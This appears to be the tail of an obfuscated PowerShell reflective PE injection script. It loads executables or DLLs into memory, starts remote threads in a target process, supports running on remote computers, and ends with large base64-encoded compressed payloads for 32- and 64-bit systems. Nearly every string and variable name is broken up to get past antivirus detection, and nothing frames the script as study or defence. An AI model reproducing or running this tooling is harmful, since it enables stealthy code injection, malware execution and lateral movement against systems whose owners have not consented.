					Throw ("{11}{4}{6}{1}{0}{9}{10}{7}{2}{3}{5}{8}" -f'llc','e','ot','e process m','ble to w','emory','rite sh','em','.','od','e to r','Una')
				}

				${RTH`ReA`DH`AnDLe} = &("{1}{3}{4}{0}{2}{5}" -f'eThre','Crea','a','te-Rem','ot','d') -ProcessHandle ${R`EMoTep`RO`ChandLe} -StartAddress ${RS`c`AddR} -Win32Functions ${Wi`N`32`FuncTIoNs}
				${re`s`Ult} = ${WIn`32fuN`CTiONs}."wAit`FoRSiN`gleoBJE`cT"."iNVO`kE"(${RT`HR`E`ADHandlE}, 20000)
				if (${R`es`ULT} -ne 0)
				{
					Throw ("{7}{0}{10}{14}{8}{6}{1}{9}{12}{2}{13}{3}{4}{15}{11}{5}"-f'l ','hrea','l','cAdd','res','d.','eRemoteT','Cal',' Creat','d t','t','aile','o ca','l GetPro','o','s f')
				}
				
				${WiN`32`FUNC`Ti`ONS}."viRTUa`lfR`ee`EX"."iNvO`KE"(${ReMO`TeP`RoC`h`AnDlE}, ${r`SCAd`dR}, [UIntPtr][UInt64]0, ${wIn`32`cONsTAn`Ts}."MeM_R`Ele`A`SE") | &("{2}{0}{1}"-f 'ut-Nul','l','O')
			}
		}
		elseif (${pEI`N`Fo}."f`ile`TypE" -ieq "EXE")
		{


			
			
			
			
			
			
			
			[IntPtr]${EX`eDo`NebY`T`EpTr} =   ${69`pB}::("{1}{0}{2}" -f 'lloc','A','HGlobal').Invoke(1)
			 (&("{3}{0}{1}{2}" -f 'et-vaRIa','b','le','g')  69pb )."VA`LUe"::("{0}{3}{1}{2}"-f 'W','te','Byte','ri').Invoke(${e`XE`doNebyte`Ptr}, 0, 0x00)
			
			[IntPtr]${exemaiNfU`NCtIo`NP`Tr} = &("{0}{5}{6}{2}{4}{3}{1}"-f 'Add','Unsigned','dIn','s','tA','-S','igne') (${pE`iN`FO}."p`EHANdle") (${P`eiNfO}."IMa`gE_`N`T_h`EAdeRs"."o`PTionAL`HE`ADeR"."a`ddreSs`ofEnTRY`pOInt")
			&("{1}{2}{0}{3}{4}" -f'-Ve','Wri','te','rb','ose') "Call EXE Main function. Address: $(Get-Hex $ExeMainFunctionPtr). Creating thread for the EXE to run in. "
			
			
			${w`IN32fUnC`Ti`oNs}."crEAt`etH`R`EAd"."In`VoKe"( ${2`m`1AJ}::"ZE`Ro",  ( &("{1}{2}{0}" -f 'Ble','Va','RIA') ("{0}{1}" -f '2M1','AJ')  -val  )::"Ze`RO", ${ExemaIn`F`U`NcTIoNPtr},  (  &("{3}{2}{0}{1}"-f 'bL','e','eT-varia','G') ("{0}{1}" -f'2','M1aJ') -VAlueO  )::"z`eRo", ([UInt32]0), [Ref]([UInt32]0)) | &("{0}{2}{1}" -f 'Ou','ull','t-N')

			while(${t`RUe})
			{
				[Byte]${th`ReADD`o`NE} =  ( &("{2}{0}{1}" -f'ldi','tEM','chI') ("v"+"ARia"+"Ble:69PB")  )."vaL`UE"::("{0}{2}{1}"-f'Rea','yte','dB').Invoke(${exe`doN`EBy`TEptr}, 0)
				if (${TH`READ`dO`NE} -eq 1)
				{
					&("{0}{2}{1}"-f 'Write-Ver','se','bo') ("{3}{0}{1}{2}{4}{5}"-f ' t','h','re','EXE','ad has completed','.')
					break
				}
				else
				{
					&("{1}{0}{2}"-f 'tart-Slee','S','p') -Seconds 1
				}
			}
			
		}
		
		
		return @(${Pei`N`Fo}."PEhaN`DLe", ${effE`c`T`I`VepehAN`dLE})
	}
	
	
	Function inv`ok`E-`m`EmORyfR`eELiB`R`ARy
	{
		Param(
		[Parameter(pOsItion=0, MAnDaTorY=${T`Rue})]
		[IntPtr]
		${Pe`HaND`Le}
		)
		
		
		${win`32`co`NStAnts} = &("{2}{3}{0}{1}{4}"-f't-Win32Co','n','G','e','stants')
		${wI`N32fUn`Ct`io`NS} = &("{2}{0}{5}{4}{3}{1}"-f '-Win','ns','Get','nctio','u','32F')
		${wIN32`TyP`Es} = &("{0}{1}{2}"-f'Get-Wi','n32T','ypes')
		
		${p`EiNFo} = &("{3}{2}{0}{1}"-f'n','fo','EDetailedI','Get-P') -PEHandle ${p`EHAn`dlE} -Win32Types ${WIn`3`2tYP`es} -Win32Constants ${W`In`32cO`NsTAN`Ts}
		
		
		if (${P`EI`NFo}."im`AgE_nt_`hEadErS"."OPtio`NA`lheA`der"."iMPOR`TtA`B`lE"."S`IzE" -gt 0)
		{
			[IntPtr]${imPor`TDEsCrI`P`T`o`Rp`TR} = &("{3}{4}{1}{2}{0}" -f 'd','d-Si','gnedIntAsUnsigne','A','d') ([Int64]${p`e`iNfO}."Pe`H`AnDLe") ([Int64]${PE`infO}."i`maGe_n`T_HEA`d`ERs"."O`PtI`On`ALheAdER"."ImPo`RTt`Ab`Le"."VI`RTuA`La`DDRE`Ss")
			
			while (${t`Rue})
			{
				${I`m`portDeSCr`iPTor} =  ${69`pB}::"pTr`TosT`Ru`ctU`Re"(${im`POrtD`eSCRip`TORPTR}, [Type]${WIN`32`TyP`eS}."I`MAgE_iMPOrT_`D`E`SC`Rip`TOr")
				
				
				if (${iMpo`RT`dES`cRI`PT`or}."C`harAct`ERIStI`cs" -eq 0 `
						-and ${Imp`oRTDEs`Cri`pt`Or}."f`iR`STTh`Unk" -eq 0 `
						-and ${Im`poRT`DeSCRIp`Tor}."fO`RWARdeRC`hAIn" -eq 0 `
						-and ${i`mpORT`d`ES`cr`IptoR}."n`Ame" -eq 0 `
						-and ${i`mPortDEs`cri`P`T`OR}."ti`meD`ATEST`AmP" -eq 0)
				{
					&("{2}{3}{0}{1}" -f'-Verb','ose','Wr','ite') ("{5}{4}{0}{3}{7}{1}{8}{6}{2}" -f 'a',' the li','y the PE','d','ne unlo','Do','raries needed b','ing','b')
					break
				}

				${IMPo`RtDll`PATh} =   (  &("{1}{0}"-f'i','gC')  ("{2}{1}{0}{3}"-f':6','aBLE','vARI','9pb'))."vA`LUe"::"pTRT`O`s`Tringan`SI"((&("{1}{3}{0}{2}{5}{4}" -f'ignedIntAsUns','Add','ign','-S','d','e') ([Int64]${P`e`InfO}."PEh`ANd`le") ([Int64]${Imp`ORTD`esCRi`Pt`Or}."na`ME")))
				${IM`pO`RT`dllHaNd`le} = ${W`i`N`32fUNCti`oNs}."GEtmODU`l`eHAN`DLe"."inV`O`KE"(${ImPOr`Tdll`PATH})

				if (${imPO`RtDLl`Ha`NdlE} -eq ${Nu`ll})
				{
					&("{3}{2}{0}{1}"-f 'War','ning','rite-','W') ('Error'+' '+'g'+'e'+'tting '+'DL'+'L '+'hand'+'le '+'i'+'n '+'Me'+'m'+'oryFree'+'Libr'+'ary,'+' '+'DLLNa'+'me'+': '+"$ImportDllPath. "+'Con'+'tinu'+'ing '+'an'+'yways') -WarningAction ("{0}{1}"-f'Contin','ue')
				}
				
				${SuC`Ce`sS} = ${wi`N3`2F`Unc`TIonS}."Fr`EElI`BRARY"."i`N`VOKe"(${imPor`Td`lLHanDLe})
				if (${SUC`CesS} -eq ${fAl`se})
				{
					&("{4}{0}{3}{2}{1}"-f'ar','g','n','ni','Write-W') ('Unab'+'le '+'to'+' '+'fre'+'e '+'li'+'brary:'+' '+"$ImportDllPath. "+'C'+'ontin'+'uing '+'anywa'+'ys.') -WarningAction ("{2}{1}{0}"-f 'inue','t','Con')
				}
				
				${I`MP`ORtDEsc`RiPt`ORPTr} = &("{4}{3}{5}{2}{0}{1}{6}" -f'sUns','igne','tA','d-','Ad','SignedIn','d') (${I`mPORTDEsC`RIp`TORptR}) (  ${69`pB}::"S`iZEOF"([Type]${wIN`3`2TY`pEs}."iMAGe_I`mpOrT_DES`CRi`pT`oR"))
			}
		}
		
		
		&("{1}{2}{0}" -f'rbose','Write-','Ve') ("{10}{12}{0}{8}{3}{2}{5}{7}{9}{1}{13}{6}{4}{11}"-f'l','e','in so',' dllma','de',' the DLL kno','loa','ws it','ling',' is b','C','d','a','ing un')
		${dLl`maIn`ptr} = &("{1}{0}{2}{3}" -f 'n','Add-SignedI','tAsU','nsigned') (${pEin`Fo}."p`EhANdLE") (${PEi`NfO}."Im`AGe_Nt_`h`Ea`DE`Rs"."O`P`TIoNa`LH`eadER"."aDDRES`s`ofe`NTrypOInt")
		${dLlM`AI`N`DeLEgA`Te} = &("{0}{3}{2}{4}{1}" -f'Get-De','pe','ate','leg','Ty') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${DlLm`Ain} =   (  &("{2}{1}{0}" -f 'e','T-VaRIaBl','Ge')  69PB  -VA )::("{1}{5}{3}{2}{4}{0}"-f'r','GetDelegateFo','oin','nP','te','rFunctio').Invoke(${DLL`Mainp`TR}, ${d`lLm`AIND`eLeG`AtE})
		
		${D`L`lmAIN}."invO`Ke"(${PEI`N`Fo}."P`EHaNd`le", 0,  ${2`M`1Aj}::"Z`eRO") | &("{0}{2}{1}" -f'Out','ull','-N')
		
		
		${sU`ccE`SS} = ${WIn32`FU`NcTIOns}."v`IRtUAlf`REE"."i`Nvo`ke"(${PE`HaN`DLE}, [UInt64]0, ${wIn3`2C`oNst`ANTs}."mem_rele`A`se")
		if (${sucCE`sS} -eq ${F`Al`se})
		{
			&("{3}{0}{2}{1}" -f'te-W','ing','arn','Wri') ((("{4}{6}{13}{9}{15}{5}{14}{7}{3}{11}{2}{10}{1}{8}{12}{0}" -f '.','ng ',' memory. Cont','on the ','U',' V','na','e ','anyw','to','inui','PEvjPs','ays','ble ','irtualFre',' call')) -CrePLaCe  'vjP',[cHar]39) -WarningAction ("{0}{1}"-f'Con','tinue')
		}
	}


	Function m`Ain
	{
		${W`iN32FU`NC`TIonS} = &("{2}{0}{3}{1}"-f'et','Functions','G','-Win32')
		${W`in32Ty`PeS} = &("{2}{1}{0}" -f's','et-Win32Type','G')
		${w`i`N`32COns`TANts} =  &("{2}{1}{3}{0}"-f 's','-Win32Cons','Get','tant')
		
		${rEMOTeP`ROc`HA`NdLe} =   (  &("{1}{0}{3}{2}"-f'E','g','ble','T-varia') ("2m1"+"Aj")  -vALueonLY)::"zE`Ro"
	
		
		if ((${proc`ID} -ne ${nu`LL}) -and (${pro`CiD} -ne 0) -and (${prOCN`A`me} -ne ${n`Ull}) -and (${p`ROc`Na`me} -ne ""))
		{
			Throw ((("{6}{1}{3}{9}{2}{10}{7}{5}{11}{8}{4}{0}"-f'er','upp','ProcId and','ly ',' oth',', choose ','Canz36t s','ocName','the','a ',' Pr','one or '))-CRePLACe([chAr]122+[chAr]51+[chAr]54),[chAr]39)
		}
		elseif (${Pr`Ocn`AmE} -ne ${n`ULL} -and ${PRoC`N`AME} -ne "")
		{
			${Pr`O`ces`SeS} = @(&("{1}{2}{0}" -f 's','Get-Proc','es') -Name ${P`R`ocn`AmE} -ErrorAction ("{2}{4}{0}{1}{3}" -f 'yConti','n','Sile','ue','ntl'))
			if (${ProC`E`sSeS}."C`oUNt" -eq 0)
			{
				Throw (('Canlfz'+'t ')."re`PlA`ce"('lfz',[StriNG][CHAR]39)+'fi'+'nd '+'p'+'roces'+'s '+"$ProcName")
			}
			elseif (${PR`OC`Esses}."C`OUNt" -gt 1)
			{
				${pR`oCINfo} = &("{3}{1}{0}{2}"-f 'Proc','et-','ess','G') | &("{0}{1}"-f'wher','e') { ${_}."N`Ame" -eq ${prO`C`NAME} } | &("{0}{2}{1}"-f'Se','ct','lect-Obje') ("{3}{1}{0}{2}"-f'a','N','me','Process'), ('Id'), ("{1}{0}{2}" -f 's','Se','sionId')
				&("{2}{0}{1}{3}"-f'i','te-Outpu','Wr','t') ${p`RoC`iNfO}
				Throw ('Mo'+'re '+'t'+'han '+'one'+' '+'in'+'st'+'ance '+'of'+' '+"$ProcName "+'f'+'ou'+'nd, '+'p'+'le'+'ase '+'sp'+'ecif'+'y '+'t'+'he '+'proces'+'s '+'ID'+' '+'to'+' '+'i'+'nj'+'ect '+'i'+'n '+'t'+'o.')
			}
			else
			{
				${P`Rocid} = ${Pr`ocESS`eS}[0]."iD"
			}
		}
		
		
		







		
		&("{1}{3}{0}{2}"-f 'erbos','Write-','e','V') ("{0}{1}{5}{4}{2}{6}{3}{7}" -f'Cal','lin','oryLoa','ar','m','g Invoke-Me','dLibr','y')
		${PeHan`D`lE} =   (  &("{2}{3}{1}{0}"-f'E','iAbL','Ge','T-VAR')  ("2m1a"+"j"))."val`UE"::"ZE`Ro"
		if (${remotep`R`o`Chan`d`LE} -eq   ${2m`1AJ}::"Ze`Ro")
		{
	
			${pelOAde`Di`NFo} = &("{3}{1}{0}{5}{4}{2}" -f 'moryLoadLib','ke-Me','ry','Invo','a','r') -PEBytes ${PEby`T`Es} -ExeArgs ${ExEA`RgS} -ForceASLR ${F`OrC`EASLR}
		}
	
		if (${PeLOa`DE`DiN`Fo} -eq  ${2`m`1aJ}::"Z`eRO")
		{
			Throw ("{5}{12}{8}{2}{1}{9}{0}{3}{10}{6}{11}{7}{4}"-f 'rn',' loa','e to','e','LL','U','i','NU','bl','d PE, handle retu','d ','s ','na')
		}
		
		${p`eH`AN`DLe} = ${Pelo`AD`EDin`FO}[0]
		${reMoTEP`E`hA`Ndle} = ${pElOaD`eDI`NFO}[1] 
		
		
		
		${PEi`N`FO} = &("{1}{0}{3}{2}" -f 't-PEDeta','Ge','nfo','iledI') -PEHandle ${peh`ANdLE} -Win32Types ${WIn`32tYP`eS} -Win32Constants ${wIN`32cONST`A`N`Ts}
		if ((${PeI`N`Fo}."FI`letY`pE" -ieq "DLL") -and (${rEM`Otepr`o`chA`Ndle} -eq   (  &("{1}{2}{0}"-f 'dItem','Chi','l') ("V"+"aR"+"ia"+"bLE"+":2m1aj")  )."vA`LuE"::"z`Ero"))
		{
			
			
			
	        switch (${f`UncReT`U`RNtYPE})
	        {
	            ("{0}{2}{1}" -f'WS','ng','tri') {
	                &("{4}{3}{1}{2}{0}"-f'ose','e-V','erb','t','Wri') ("{2}{5}{4}{0}{7}{6}{3}{1}"-f'h WSt','pe','Calling','y','ction wit',' fun','rn t','ring retu')
				    [IntPtr]${WS`TRinGf`UN`c`AdDr} = &("{5}{3}{1}{0}{2}{4}"-f 'r','o','yProcAddre','em','ss','Get-M') -PEHandle ${Peh`An`DLE} -FunctionName ("{1}{0}{2}"-f 'F','WString','unc')
				    if (${W`st`R`iNgf`Un`cAddR} -eq  ( &("{0}{2}{1}" -f 'ch','iTeM','Ild')  ("VArI"+"able:"+"2"+"m"+"1aJ"))."VaL`UE"::"Z`ErO")
				    {
					    Throw ((("{2}{3}{0}{6}{9}{5}{8}{1}{10}{7}{4}" -f '6','tion add','Coul','dn','ss.','n','YRt ','e','c','find fu','r'))-crEpLACE '6YR',[cHAR]39)
				    }
				    ${ws`T`RINGF`UnC`d`EleG`ATE} = &("{2}{3}{1}{0}" -f 'pe','Ty','Get-D','elegate') @() ([IntPtr])
				    ${Wst`RinG`FuNc} =  ( &("{3}{0}{1}{2}" -f 'V','a','RiablE','GEt-') 69PB  -ValUEoNLy  )::("{1}{6}{4}{7}{2}{5}{0}{3}"-f 'P','G','eForFu','ointer','a','nction','etDeleg','t').Invoke(${wSTrinGf`Un`C`Ad`Dr}, ${WSTrI`NGfUNcdE`LeGA`TE})
				    [IntPtr]${O`U`TP`UTpTR} = ${WSTR`iN`GFu`NC}."I`N`VOkE"()
				    ${ou`TPUt} =  ( &("{0}{1}{2}"-f'CH','IlDit','Em') ("{2}{0}{4}{1}{3}" -f 'I','BLe','var',':69Pb','A'))."V`Alue"::("{4}{1}{3}{2}{0}" -f 'i','tr','Un','ing','PtrToS').Invoke(${oUtpU`Tp`Tr})
				    &("{2}{0}{1}"-f'tp','ut','Write-Ou') ${ouTP`UT}
	            }

	            ("{2}{0}{1}"-f 't','ring','S') {
	                &("{0}{2}{3}{1}{4}"-f 'Writ','os','e-Ve','rb','e') ("{0}{5}{1}{7}{8}{4}{2}{9}{3}{6}" -f'Calling ','ction w','re','urn ty',' ','fun','pe','ith St','ring','t')
				    [IntPtr]${stRI`N`G`FUNcA`dDR} = &("{1}{2}{6}{3}{5}{0}{4}"-f're','Ge','t-M','o','ss','cAdd','emoryPr') -PEHandle ${Pe`HAnD`LE} -FunctionName ("{2}{1}{0}"-f 'ingFunc','r','St')
				    if (${Str`iN`GF`UNCaD`DR} -eq   (&("{0}{2}{1}"-f 'va','Le','RIAB') ('2M1'+'Aj')  )."val`UE"::"z`ErO")
				    {
					    Throw ((("{1}{6}{3}{4}{2}{7}{0}{5}" -f' address','Couldn{0','i','un','ct','.','}t find f','on'))-f  [CHar]39)
				    }
				    ${STRi`NGF`U`NcdE`LEgate} = &("{2}{4}{3}{1}{0}" -f'ype','eT','G','t','et-Delega') @() ([IntPtr])
				    ${StR`in`G`Func} =   ${6`9PB}::("{0}{4}{1}{2}{3}"-f'GetD','F','unctionP','ointer','elegateFor').Invoke(${S`Tr`INgFUnc`A`dDR}, ${s`Tr`ingFUncD`e`Le`GaTe})
				    [IntPtr]${Ou`TPUT`PtR} = ${s`TR`INgf`Unc}."i`NVOKE"()
				    ${O`UtPut} =   (&("{2}{0}{1}"-f'ARi','aBLE','V')  69Pb  -VALUe  )::("{3}{1}{4}{0}{2}"-f 'Ans','rTo','i','Pt','String').Invoke(${O`UtpU`T`PTr})
				    &("{3}{0}{2}{1}"-f'ite-Out','t','pu','Wr') ${o`UTPUt}
	            }

	            ("{0}{1}"-f'Vo','id') {
	                &("{3}{1}{2}{0}" -f 'se','te-','Verbo','Wri') ("{1}{9}{4}{7}{5}{3}{0}{8}{6}{10}{2}" -f' ','Calling ','pe','with','unctio',' ','id re','n','Vo','f','turn ty')
				    [IntPtr]${V`O`iDF`UNcADdr} = &("{1}{4}{2}{0}{5}{6}{3}" -f'Pr','Get-','y','ess','Memor','o','cAddr') -PEHandle ${peh`A`N`dle} -FunctionName ("{1}{2}{0}" -f 'unc','Vo','idF')
				    if (${V`OI`Dfu`NC`AdDR} -eq  ( &('Ls')  ('VaRIAb'+'le:'+'2'+'M1a'+'j')  )."VA`lUE"::"ZE`RO")
				    {
					    Throw ((("{3}{0}{8}{1}{7}{4}{6}{5}{2}" -f 'o','nd','dress.','C','functio','d','n a',' ','uldn{0}t fi'))  -F[cHaR]39)
				    }
				    ${VOID`FuNcD`EL`E`G`AtE} = &("{0}{3}{2}{4}{1}" -f'Get-D','pe','te','elega','Ty') @() ([Void])
				    ${Vo`i`DFUnc} =   ( &("{1}{2}{0}" -f 'RiaBlE','v','a') 69PB)."Va`Lue"::("{0}{4}{2}{1}{3}{5}{6}" -f'GetDel','te','ga','Fo','e','rFunctionP','ointer').Invoke(${vOid`F`U`NcADdr}, ${VoIDF`UncDeL`eG`AtE})
				    ${voIDF`UNC}."I`NVoke"() | &("{0}{1}{2}"-f'O','ut','-Null')
	            }
	        }
			
			
			
		}
		
		elseif ((${pE`in`FO}."Fi`LETYPE" -ieq "DLL") -and (${r`eM`oTepRoC`HAN`dLe} -ne  ( &("{1}{0}{3}{2}" -f't','GE','lE','-VaRIaB')  ("2M1A"+"J")  -vAlUE )::"ze`Ro"))
		{
			${voIdFu`Nca`d`DR} = &("{3}{0}{2}{1}"-f't-Memo','ProcAddress','ry','Ge') -PEHandle ${pEHa`N`DLe} -FunctionName ("{1}{2}{0}"-f 'nc','VoidF','u')
			if ((${vO`IDfU`Nc`Addr} -eq ${n`ULL}) -or (${vo`iD`FUnC`A`DdR} -eq  (  &("{0}{1}" -f'i','TEm') ("{2}{4}{0}{3}{1}" -f 'iAbLE','j','vA',':2M1A','r')  )."VA`lUE"::"ZE`RO"))
			{
				Throw ((("{4}{0}{2}{5}{3}{1}" -f'nc couldn{0}t','he DLL',' be fo',' in t','VoidFu','und')) -F[char]39)
			}
			
			${VOI`dFUnCa`Ddr} = &("{3}{5}{1}{0}{4}{2}" -f'tAsUn','In','igned','Sub-Si','s','gned') ${vO`i`D`FuNcaDdr} ${PEHA`Ndle}
			${v`oiDfu`NCA`ddr} = &("{0}{6}{3}{4}{2}{5}{1}"-f'Add','nsigned','nt','gne','dI','AsU','-Si') ${vo`iDFUn`cadDR} ${REmOtEpEh`A`N`D`le}
			
			
			${rTHrEA`DHa`N`D`Le} = &("{0}{1}{3}{2}{4}{5}" -f'Cr','e','e','at','-Rem','oteThread') -ProcessHandle ${ReMot`epr`O`cHa`NDLe} -StartAddress ${voiDfu`N`cAddR} -Win32Functions ${Win32fu`NC`T`IOns}
		}
		
		
        
		if (${remOTe`pr`OcHaN`DLE} -eq   (&("{0}{1}" -f 'Gc','i') ("{1}{0}{3}{4}{2}"-f'ri','vA','2M1aj','A','BLE:'))."VAL`UE"::"zE`Ro" -and ${pe`i`NfO}."f`I`lEtyPE" -ieq "DLL")
		{
			&("{2}{4}{0}{3}{5}{1}" -f 'm','ibrary','Invoke-','oryF','Me','reeL') -PEHandle ${PEhA`N`DLe}
		}
		else
		{
			
			${suC`cE`SS} = ${wi`N32fU`NCt`ionS}."vIR`TuaLF`REe"."I`NvOKe"(${p`E`HAndle}, [UInt64]0, ${W`iN32Co`N`stA`NTS}."MEM`_`REl`eAsE")
			if (${S`UC`CESS} -eq ${Fa`L`se})
			{
				&("{1}{2}{0}" -f'rning','Writ','e-Wa') ((("{7}{4}{1}{19}{11}{10}{17}{6}{8}{14}{16}{9}{13}{3}{18}{2}{12}{0}{5}{15}" -f 'g ',' t','inui','n','able','any',' ','Un','t','C','tu','Vir','n','o','he','ways.',' PE{0}s memory. ','alFree on','t','o call '))  -F [ChAr]39) -WarningAction ("{1}{2}{0}"-f 'e','C','ontinu')
			}
		}
		
		&("{0}{2}{1}{3}" -f 'Wri','bo','te-Ver','se') ("{1}{0}"-f'ne!','Do')
	}

	&("{1}{0}" -f 'in','Ma')
}


Function m`AIN
{
	if ((${PS`C`M`dlet}."my`invo`CATI`oN"."BO`U`Nd`P`ARaMeTERs"[("{0}{1}" -f'Deb','ug')] -ne ${Nu`LL}) -and ${pSc`MD`l`Et}."M`y`InvoCaTI`On"."bOundP`ARAme`TERS"[("{1}{0}" -f'bug','De')]."is`PreSEnT")
	{
		${DEbugP`REFER`eNCe}  = ("{1}{0}"-f 'inue','Cont')
	}
	
	&("{1}{3}{0}{2}"-f'er','Wr','bose','ite-V') ('PowerS'+'he'+'ll '+'Proces'+'sI'+'D:'+' '+"$PID")
	
	
	${e`_Ma`Gic} = (${P`eB`YTeS}[0..1] | &('%') {[Char] ${_}}) -join ''

    if (${e`_mAg`ic} -ne 'MZ')
    {
        throw ("{2}{1}{0}{5}{4}{3}"-f'a valid P','not ','PE is ','.','le','E fi')
    }

	if (-not ${D`ON`Ot`ZeROmZ}) {
		
		
		${PE`ByT`ES}[0] = 0
		${peb`y`TEs}[1] = 0
	}
	
	
	if (${EXEa`RGS} -ne ${nU`ll} -and ${E`XEA`RgS} -ne '')
	{
		${ExeA`R`gS} = ('R'+'ef'+'lectiveExe'+' '+"$ExeArgs")
	}
	else
	{
		${e`xeAr`gS} = ("{2}{0}{3}{1}" -f 'ct','veExe','Refle','i')
	}

	if (${cO`mpuTer`N`A`mE} -eq ${Nu`Ll} -or ${CO`MPUtER`N`A`mE} -imatch "^\s*$")
	{
		&("{0}{4}{1}{3}{2}" -f'I','ke-Co','d','mman','nvo') -ScriptBlock ${re`mo`TesCR`IPtblo`cK} -ArgumentList @(${pEbY`TeS}, ${fUn`cRE`TuRNty`Pe}, ${pR`OcID}, ${prOC`N`A`Me},${f`ORc`EAslr})
	}
	else
	{
		&("{2}{0}{1}" -f 'mma','nd','Invoke-Co') -ScriptBlock ${rEMO`TEscRipTb`l`OCK} -ArgumentList @(${Peb`yT`Es}, ${FUncRe`T`UrN`TY`pE}, ${PR`ocId}, ${pr`ocNAmE},${f`OrCEAs`Lr}) -ComputerName ${co`M`PU`T`erNamE}
	}
}

&("{0}{1}"-f 'Ma','in')
}

if ( ${2`m1`AJ}::"s`IZE" -eq 8) {
	${baSE6`4D`AtA}=("{14}{0}{18}{7}{2}{13}{4}{19}{9}{12}{21}{1}{15}{28}{24}{8}{10}{22}{30}{17}{11}{29}{16}{20}{26}{3}{25}{27}{6}{23}{5}" -f '4sIAGrIaF4C/+1Yf2gbdRQ/ENw/0qKbVtRaEEUsbJUNaoprwsBSUfqXCOIQ3Z+CIIUj','cBGVrVi4Pmm+u+VbnBWFGPSOXqG4PIPQ8cJZpUu4INghRNJaXxi3ordejQoUOHDh06dOjQoUOHjv8vDhFXTCsAxJWOFb0Zuw8/TFR5cWL7erZwSx5Q5cLf7/dr67Ed9j+UTL+HEux0KGCzQWw97rFT1jAjMQwdAhjN8MOZ1HyuGGQY/Qz+','quwav/nbwa','fjw5xl/ySbOztDU4Ou8BXACHm6Vmj9oh93blm7','3KnOjcIrZnvfNkRT7ZeQJz6ouHO09X+IMVzn','tX2qbWFtF7//fwJE+Z0uABwAAA==','iZTD+In7Y7HDMTdEcRa1r7wVJxq1+7xn','pmp23v+b3k6tbOTfAfqdyHvLz3vu993733vt97f1zHm+/DBgCsYyIIgHaoIgv/jBcwXVt','jYyP5ZpQ3vTYVPr35tSwZ','ClfFthVTmrgCZvVusHuMXRBCa8XvisYu79K8BWnDv0b','m1clxVj/EC8lVC9ycgopTf4P+0vXN1e67Tgc2duF/1G3ifJhi0Ci0jiZlUWl6Yk4Ipol8nIXUp7TYmrRZhqsNamN1OJaZvqA9dkY9l/E/n6J/','U','SI0TQIw9','ruSOnh1yOuxyQ477bOHXXIo7HTSlHwuINutTtnjlMeTnOyig4Hi6uqNRS3G9OIvT5','H','S9yHeh6vrTuEJSkhCXwi','pYDp+aXAsQg86ElLOlx7','/DjO','ZbXY/bBrmkvMJbf8zrKoXLK0d7m0ae9r0vYC1rVd1ySm/qGusqv4RxCs6e','tCXtVvZy5CBiB4fANOTbWMbq3VwvdwfVMBKG','u8/cNRSIjQ2eY6bOXGY/I8JkBdtC1EE7k3ZQtkmKppH3YlT47vEA70vmBPt5bmKU/5mP','+hdFsdfg38BXEvpHuYiFeinMB8uawkt31aUBhngfNEeDFNhgA+0mGqR8NOOHPGvGHZabGo/NrTeqbFKd8RrAB27Eqhn7zeiwaierGgwqT','BVh+UcsS+Q63tYkxaTYJ1EWs6jEop69ssQTDVhhEbn8yChBEJ+i/NOceMTicXqcAQqkODI/KRpaU5bvbhKNH','ssrxJSDKE3efW3ebe9sn0865','L7A4jkz2MqYZIRaRfQyst','+AKze07hssfkk0InOL+0YEmWvcSyzv7Z0HEM0N7nUpKrZZ08eOVwvF/eJwL2pwmGrfDK0Lv5c+Ihq7TdYlZDB2/Yy3tY3','RZCB3bsYanZidWRiIsP2fzzGJnFCIR9OOfgfPzfn7Cm5OSNjy3lxo','XzjVU/RHxPLW57/W6ONa4qDvLiuYDxvqy+pW5rHrGjnKPaZ7vqUfyKI6NzM+odllN4H6xbfldc73m0vOijK9Sh5+8','jv','5suxg/84baC6KxTp1hFoul6KNpHxMohmgXsMhsFA2mlxSAir97A2+5YH6nRdtyDLOvhMDQiDuZv0B5HF4xJ3mFgtUVlbz','Ic1jh3Jm')

}else{
	${Ba`Se6`4`DATA}=("{33}{3}{7}{1}{29}{39}{44}{27}{28}{17}{16}{37}{31}{32}{26}{41}{36}{23}{30}{42}{2}{21}{43}{11}{14}{8}{20}{18}{5}{12}{22}{38}{46}{6}{10}{19}{4}{40}{35}{9}{0}{13}{47}{45}{25}{24}{15}{34}" -f'nIK/eL8yL5M2ENBpuW0SKevRNRD2qqraYw/26gc50GgrohgJ5pXfD0DGvenjJAmnfRfAiRkX0jAh7a7AigOT77YuvQ9GQU+/XyxmhbSo/Wp20hdneVg7v33EXmsPrYwsUbX5D7n0sH/IiNzsrfiVZmVVRn24inVU02Yn3JWL8HI/eN+keoW','UT3NDKHaTKG8ZhWxIALP9jBvWgSil0zP75IhW00LcTSlHJYz5/UvGw9LqsFqSr5/IT8krAvG55St4dE5j8BPzMxuRPAmBn+2WfPUco6oOGrI2XVxwtoMKqbMyKfCIS+Z5fQKqZv89sBCwlHih/o2QY0r2z5Rk6NpbJTGXyN6LvPsmXXB6Gxrox+ZLc/IGoxN40DLW56fPpr/IjUYnQOQ/pWhi4zR+Lzo6Dd7qozgWZapqB5/wB4LmHn3drCsYGj6T8AegNn87wAF8vRi1vClAsritl8tsZne8svZdVngr+lmhIzhI0FM0ejzz8F0iKCrpx9J9JYACDxi5X30XqZ0UFWg2j96CfJl0Fh+3P6Jde1w8oKgArrF5Mg1fAjPr3N7cZGX0k0tNFBeBVXieFeomofDMkH6pjStekwNAL2B2NWmZIYfDkBwfs9pDdtoB5evgZPPoH7I4MzKcDdusD870Di4aAnAJHzQrUpwTq4wMKhLn6YEVHXUmw3zBJcMTg+YHBt4b679cfCV45TFITMdj/dvDkiLmHgr6nh0XM2iuCxAYGB7DBu3p','fetPpL++/lD5TubS7G/Kr2OmtbuG8etQcIJyznESPr38l9TokD3GVx9tkUcBsQDOPJzOs10XttKZbHS+grGpoO224fYrXs6xG0U4fGXGKF1LW8SOkRZ+aMfxupaI9yfjsFM+UqOxpAqup6sLENIuZHYbAoTN+nJxHomSE814i2+Z0E15NYui/kjpK5SF/+sQrW3zH2+TBlbfo9HbUoBQWYNowUn7endZgFh11SI8TtZ3YBYbNUAivMVFIovCHRz5DONWhl49xmMPXVi9sto0fCIrAKcmxXZG8yXSoNWb76BtkXvRu6tmbiocoXr721qlF8WDexXBHE3bat4PWiPzC4owhvLG0ZvTBlddssogPME4kCGVijAfc+Ay0ZP/qCjfblP2kKdsIIN3iGKS7/bL4v+MAPE1xlI8/UGAbvxWacgrqgaYgEy6K/R6a0hWaAshoe92UB4ZAaEoKsKX+Tvvpb6SONix16ANCyMR1ss3wjG3I4JpI3qTU3TeH/uXnXCZwnDLvKY9PWiI8WdNBGwKhfJUz4ygMv7wpDZeFpjOX487IrigvlrWV7V